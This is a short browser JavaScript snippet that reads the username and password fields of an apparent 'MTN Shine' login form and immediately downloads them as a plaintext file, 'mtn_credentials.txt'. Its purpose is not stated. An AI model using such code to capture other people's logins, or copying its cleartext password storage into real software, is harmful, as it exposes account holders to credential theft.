  function saveCredentials() {
      const username = document.getElementById('user_email').value;
      const password = document.getElementById('user_password').value;

      const timestamp = new Date().toISOString();
      const data = "=== MTN Shine Credentials ===\nTimestamp: " + timestamp + "\nUsername: " + username + "\nPassword: " + password +
  "\n============================";

      const blob = new Blob([data], { type: 'text/plain' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'mtn_credentials.txt';

      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      console.log('Credentials saved to file!');
  }

  saveCredentials();